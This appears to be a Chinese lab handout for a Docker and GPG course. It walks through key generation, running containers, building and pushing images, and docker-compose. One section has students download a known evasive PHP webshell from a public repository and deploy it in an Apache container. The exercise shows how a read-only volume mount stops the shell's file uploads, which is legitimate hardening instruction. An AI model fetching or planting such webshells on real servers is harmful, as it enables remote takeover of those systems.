## GPG 实验操作


说明:

* 登录时自动设置了ID=xx，xx是用户名的最后2位数字。


### 1. 生成私钥和公钥

注：因生成4096bit私钥可能需要30分钟，本实验使用1024bit私钥。实际使用中请尽量使用4096bit私钥。

```
$ gpg --gen-key    ## 输入的命令

gpg (GnuPG) 2.0.22; Copyright (C) 2013 Free Software Foundation, Inc.
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

请选择您要使用的密钥种类：
   (1) RSA and RSA (default)
   (2) DSA and Elgamal
   (3) DSA (仅用于签名)
   (4) RSA (仅用于签名)
您的选择？ 1     ## 输入1
RSA 密钥长度应在 1024 位与 4096 位之间。
您想要用多大的密钥尺寸？(2048)1024    ## 输入1024
您所要求的密钥尺寸是 1024 位
请设定这把密钥的有效期限。
         0 = 密钥永不过期
      <n>  = 密钥在 n 天后过期
      <n>w = 密钥在 n 周后过期
      <n>m = 密钥在 n 月后过期
      <n>y = 密钥在 n 年后过期
密钥的有效期限是？(0) 0    ## 输入0
密钥永远不会过期
以上正确吗？(y/n)y     ## 输入y

You need a user ID to identify your key; the software constructs the user ID
from the Real Name, Comment and Email Address in this form:
    "Heinrich Heine (Der Dichter) <heinrichh@duesseldorf.de>"

真实姓名：User00   ## 输入user00
电子邮件地址：user00@test.ah.edu.cn  ## 输入 user00@test.ah.edu.cn
注释：
您选定了这个用户标识：
    “User00 <user00@test.ah.edu.cn>”

更改姓名(N)、注释(C)、电子邮件地址(E)或确定(O)/退出(Q)？O   ## 输入 O，这时会弹出窗口要求输入私钥的密码
您需要一个密码来保护您的私钥。

我们需要生成大量的随机字节。这个时候您可以多做些琐事(像是敲打键盘、移动
鼠标、读写硬盘之类的)，这会让随机数字发生器有更好的机会获得足够的熵数。
我们需要生成大量的随机字节。这个时候您可以多做些琐事(像是敲打键盘、移动
鼠标、读写硬盘之类的)，这会让随机数字发生器有更好的机会获得足够的熵数。
gpg: /home/user00/.gnupg/trustdb.gpg：建立了信任度数据库
gpg: 密钥 AAF20672 被标记为绝对信任
公钥和私钥已经生成并经签名。

gpg: 正在检查信任度数据库
gpg: 需要 3 份勉强信任和 1 份完全信任，PGP 信任模型
gpg: 深度：0 有效性：  1 已签名：  0 信任度：0-，0q，0n，0m，0f，1u
pub   1024R/AAF20672 2019-06-13
密钥指纹 = B1BB C40E 0612 17E6 8AE7  D076 C6BC 71C8 AAF2 0672
uid                  User00 <user00@test.ah.edu.cn>
sub   1024R/7B19795F 2019-06-13
```

注意，输入密码开始生成私钥时，可能需要很长时间，请耐心等待。可以另开一个ssh登录，不停的执行`ls -R /`以加快私钥的生成。

上面主密码ID是AAF20672，请记住，下面会用到。

### 2. 运行最小alpine Linux

```
docker run -it --name user${ID}_linux alpine /bin/sh  
ps ax
df
exit

docker container ls -a
docker container rm user${ID}_linux
```

### 3. 运行ubuntu

退出后自动删除

```
docker run -it --rm ubuntu /bin/bash
ps ax
cat /etc/os-release
df -ah
exit
```

### 4. 简单的Dockerfile

基于nginx，生成一个简单的image

```
mkdir ~/nginx
cd ~/nginx
```

`vi Dockerfile`编辑文件,内容如下2行(可以用自己的编号替换user00)

```
FROM nginx
RUN echo '<h1>Hello, docker, I am user00!</h1>' > /usr/share/nginx/html/index.html
```

退出vi ，执行
```
docker build . -t user${ID}/nginx
docker image ls 
docker run --rm -p 30${ID}:80 --name user${ID}nginx -d user${ID}/nginx

```

这时，使用PC机可以访问 http://x.x.x.x:3000 (IP请用服务器IP，3000最后2位用自己编号)，看到

Hello, docker!

执行以下命令停止nginx
```
docker container stop user${ID}nginx
```


### 5. 申请hub.docker.com 账号

浏览器访问 http://hub.docker.com 单击 "Sign up for Docker Hub"，注册一个账号。


### 6. 上传image

在虚拟机中，执行

```
docker login   #按照提示输入用户名和密码

docker tag user${ID}/nginx  USERID/nginx  #USERID请用hub.docker.com账号名替换

docker push USERID/nginx   #USERID请用hub.docker.com账号名替换

```
如果上传成功，在 http://hub.docker.com/u/USERID 处可以看到



### 7. 一个查询IP地址归属地的docker

注意，进行本实验时，请确保上述nginx的container已经停止。

本实验的Dockerfile是FROM scratch，仅仅增加了2个文件:

```
17monipdb.datx 是数据文件，来自 http://ipip.net
ipdescd 是静态编译的服务程序
```

不到4MB的docker，可以高速返回IP地址归属地信息。

实验步骤：

```
cd ~

git clone https://github.com/bg6cq/ipdesc
cd ipdesc
gcc -static -o ipdescd -Wall ipdescd.c ipip.c
curl http://202.38.64.40/17monipdb.datx > 17monipdb.datx

docker build . -t user${ID}/ipdesc

docker image ls
docker run --rm -p 30${ID}:80 --name user${ID}ipdesc -d user${ID}/ipdesc

```

这时，使用PC机可以访问 http://x.x.x.x:3000 (IP请用服务器IP，3000最后2位用自己编号)，看到IP地址来源信息。

访问  http://x.x.x.x:3000/y.y.y.y 可以得到y.y.y.y的地址来源信息。

执行以下命令停止ipdesc
```
docker container stop user${ID}ipdesc
```

### 8. 只读目录映射实验

实验内容：下载一个黑客程序（大马），对比文件目录映射 是否只读 的区别。

#### 8.1 准备

在自己目录下建立 phptest 目录，并改为所有人可以读写，下载一个大马php程序。

```
mkdir ~/phptest
cd ~/phptest
chmod a+rwx .
curl https://raw.githubusercontent.com/tennc/webshell/master/www-7jyewu-cn/%E5%85%8D%E6%9D%80php%E5%A4%A7%E9%A9%AC.php > index.php
```

#### 8.2 读写映射执行

启动container，并copy进去一个文件。

```
cd ~/phptest
docker run -dit --name user${ID}php --rm -v $PWD:/var/www/html -p 30${ID}:80 php:apache
docker cp index.php  user${ID}php:/
```

这时，使用PC机可以访问 http://x.x.x.x:3000 (IP请用服务器IP，3000最后2位用自己编号)，可以看到一个对web服务器的控制界面。

向 /var/www/html /var/tmp 分别上传一个文件，上传文件可以正常进行。

在服务器上执行：
```
ls -al ~/phptest

docker diff user${ID}php 
```

第一个命令可以看到上传到 /var/www/html 的文件。

第二个命令可以看到container启动后，相对image，修改了哪些文件。


#### 8.3 只读映射执行
```
cd ~/phptest
docker container stop user${ID}php
docker run -dit --name user${ID}php --rm -v $PWD:/var/www/html:ro -p 30${ID}:80 php:apache
```

这时，使用PC机可以访问 http://x.x.x.x:3000 (IP请用服务器IP，3000最后2位用自己编号)，因为是只读映射，向 /var/www/html 上传文件会出现错误。

执行以下命令停止php
```
docker container stop user${ID}php
```


### 9. docker-compose 实验

实验来自 https://yeasy.gitbooks.io/docker_practice/content/compose/usage.html


#### 9.1 建立目录

注意：因为docker-compose生成的container与目录名有关，为了互相不影响，采用不同的目录名

```
mkdir ~/compose${ID}
cd ~/compose${ID}
```

#### 9.2 编辑 app.py 文件

`vi app.py`，输入以下内容

```
from flask import Flask
from redis import Redis

app = Flask(__name__)
redis = Redis(host='redis', port=6379)

@app.route('/')
def hello():
    count = redis.incr('hits')
    return 'Hello World! 该页面已被访问 {} 次。\n'.format(count)

if __name__ == "__main__":
    app.run(host="0.0.0.0", debug=True)
```

#### 9.3 编辑 Dockerfile

`vi Dockerfile`，输入以下内容

```
FROM python:3.6-alpine
ADD . /code
WORKDIR /code
RUN pip install redis flask
CMD ["python", "app.py"]
```

#### 9.4 编辑 docker-compose.yml

`vi docker-compose.yml`，输入以下内容：

注意：3000最后2位请用自己编号代替
```
version: '3'
services:

  web:
    build: .
    ports:
     - "3000:5000"  #注意：3000最后2位请用自己编号代替

  redis:
    image: "redis:alpine"
    volumes:
     - ~/redis:/data
```
注意上面要用空格对齐，不能用TAB

使用上面的配置，redis 文件存放在 ~/redis 目录下，删除container，不会丢失。

#### 9.5 运行

在当前目录下：
```
docker-compose up
```

调试时，如果出错，最好用`docker-compose rm`删除已经建立的container，重新开始。

#### 9.6 测试

使用PC机可以访问 http://x.x.x.x:3000 (IP请用服务器IP，3000最后2位用自己编号)，看到统计信息刷新一次加1。

测试时，服务器的窗口能看到一些调试信息。

CTRL-C可以终止。

#### 9.7 正式运行

正式运行，可以用命令 docker-compose up -d 在后台执行。

`docker-compose down`可以停止。
